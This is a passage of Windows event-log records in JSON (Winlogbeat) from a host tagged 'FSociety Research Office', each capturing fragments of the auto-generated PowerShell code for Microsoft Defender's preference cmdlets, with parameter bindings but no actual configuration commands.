$__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'UnknownThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('LowThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${LowThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'LowThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ModerateThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${ModerateThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ModerateThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('HighThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${HighThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'HighThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SevereThreatDefaultAction')) {\n          [object]$__cmdletization_value = ${SevereThreatDefaultAction}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SevereThreatDefaultAction'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableBlockAtFirstSeen')) {\n          [object]$__cmdletization_value = ${DisableBlockAtFirstSeen}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableBlockAtFirstSeen'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('PUAProtection')) {\n          [object]$__cmdletization_value = ${PUAProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'PUAProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CloudBlockLevel')) {\n          [object]$__cmdletization_value = ${CloudBlockLevel}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudBlockLevel'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('CloudExtendedTimeout')) {\n          [object]$__cmdletization_value = ${CloudExtendedTimeout}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'CloudExtendedTimeout'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableNetworkProtection')) {\n          [object]$__cmdletization_value = ${EnableNetworkProtection}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableNetworkProtection'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('EnableControlledFolderAccess')) {\n          [object]$__cmdletization_value = ${EnableControlledFolderAccess}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'EnableControlledFolderAccess'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AttackSurfaceReductionOnlyExclusions')) {\n          [object]$__cmdletization_value = ${AttackSurfaceReductionOnlyExclusions}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AttackSurfaceReductionOnlyExclusions'; ParameterTyp"}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"ty()]\n    [switch]\n    ${DisableRestorePoint},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dsmndfsc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableScanningMappedNetworkDrivesForFullScan},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dsnf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableScanningNetworkFiles},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${UILockdown},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('tiddefaci')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [long[]]\n    ${ThreatIDDefaultAction_Ids},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('tiddefaca')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ThreatAction[]]\n    ${ThreatIDDefaultAction_Actions},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('unktdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${UnknownThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ltdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${LowThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('mtdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ModerateThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('htdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${HighThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('stdefac')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${SevereThreatDefaultAction},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dbaf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableBlockAtFirstSeen},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${PUAProtection},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${CloudBlockLevel},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('cloudextimeout')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${CloudExtendedTimeout},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableNetworkProtection},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableControlledFolderAccess},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionOnlyExclusions},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessAllowedApplications},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${ControlledFolderAccessProtectedFolders},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [string[]]\n    ${AttackSurfaceReductionRules_Ids},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.MpPreference.ASRRuleActionType[]]\n    ${AttackSurfaceReductionRules_Actions},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('elcp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableLowCpuPriority},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('efhc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableFileHashComputation},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('efsobp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableFullScanOnBatteryPower},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ppurl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ProxyPacUrl},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('proxsrv')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ProxyServer},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('proxbps')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ProxyBypass},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('fupo')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${ForceUseProxyOnly},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dtlsp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableTlsParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dhttpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableHttpParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ddnsp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableDnsParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ddnstcpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableDnsOverTcpParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dsshp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableSshParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('puc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${PlatformUpdatesChannel},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('euc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EngineUpdatesChannel},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('duc')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DefinitionUpdatesChannel},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dgr')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableGradualRelease},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('anpdl')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${AllowNetworkProtectionDownLevel},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('adpows')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${AllowDatagramProcessingOnWinServer},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('ednss')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${EnableDnsSinkhole},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dicf')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableInboundConnectionFiltering},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('drdpp')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableRdpParsing},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('dnppt')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${DisableNetworkProtectionPerfTelemetry},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('tlps')]\n    [ValidateNotNull()]\n    [ValidateNotNullOrEmpty()]\n    [switch]\n    ${TrustLabelProtectionStatus},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [switch]\n    ${Force},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [Alias('Session')]\n    [ValidateNotNullOrEmpty()]\n    [CimSession[]]\n    ${CimSession},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [int]\n    ${ThrottleLimit},\n\n    [Parameter(ParameterSetName='Remove2')]\n    [switch]\n    ${AsJob})\n\n    DynamicParam {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()\n                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)\n\n                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])\n                {\n                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()\n                }\n            }\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n\n    Begin {\n        $__cmdletization_exceptionHasBeenThrown = $false\n        try \n        {\n            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters\n            $__cmdletization_objectModelWrapper.BeginProcessing()\n        }\n        catch\n        {\n            $__cmdletization_exceptionHasBeenThrown = $true\n            throw\n        }\n    }\n        \n\n    Process {\n        try \n        {\n            if (-not $__cmdletization_exceptionHasBeenThrown)\n            {\n      $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionPath')) {\n          [object]$__cmdletization_value = ${ExclusionPath}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionPath'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionExtension')) {\n          [object]$__cmdletization_value = ${ExclusionExtension}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionExtension'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionProcess')) {\n          [object]$__cmdletization_value = ${ExclusionProcess}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionProcess'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('ExclusionIpAddress')) {\n          [object]$__cmdletization_value = ${ExclusionIpAddress}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'ExclusionIpAddress'; ParameterType = 'System.String[]'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter ="}
{"timestamp":"2021-09-15T16:35:23","winlog.event_data.CommandLine":null,"winlog.event_data.user":null,"winlog.event_data.ParentCommandLine":null,"event_type":"winlogbeat","winlog.computer_name":"DESKTOP-5SGI8C0","perch_company_name":"FSociety Research Office","timestamp_2":"2021-09-15T16:35:23","src_ip":"192.168.0.191","http.url":null,"tls.sni":null,"winlog.task":"Execute a Remote Command","registry.key":null,"winlog.event_data.Image":null,"powershell.file.script_block_text":"\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureBlobUpdateInterval')) {\n          [object]$__cmdletization_value = ${SignatureBlobUpdateInterval}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobUpdateInterval'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SignatureBlobFileSharesSources')) {\n          [object]$__cmdletization_value = ${SignatureBlobFileSharesSources}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SignatureBlobFileSharesSources'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('MeteredConnectionUpdates')) {\n          [object]$__cmdletization_value = ${MeteredConnectionUpdates}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MeteredConnectionUpdates'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('AllowNetworkProtectionOnWinServer')) {\n          [object]$__cmdletization_value = ${AllowNetworkProtectionOnWinServer}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'AllowNetworkProtectionOnWinServer'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableDatagramProcessing')) {\n          [object]$__cmdletization_value = ${DisableDatagramProcessing}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableDatagramProcessing'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('DisableCpuThrottleOnIdleScans')) {\n          [object]$__cmdletization_value = ${DisableCpuThrottleOnIdleScans}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'DisableCpuThrottleOnIdleScans'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('MAPSReporting')) {\n          [object]$__cmdletization_value = ${MAPSReporting}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}\n        } else {\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'MAPSReporting'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}\n        }\n        $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)\n\n        [object]$__cmdletization_defaultValue = $null\n        [object]$__cmdletization_defaultValueIsPresent = $false\n        if ($PSBoundParameters.ContainsKey('SubmitSamplesConsent')) {\n          [object]$__cmdletization_value = ${SubmitSamplesConsent}\n          $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'SubmitSamplesConsent'; ParameterType = 'System.Management.Automation.SwitchParameter'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = 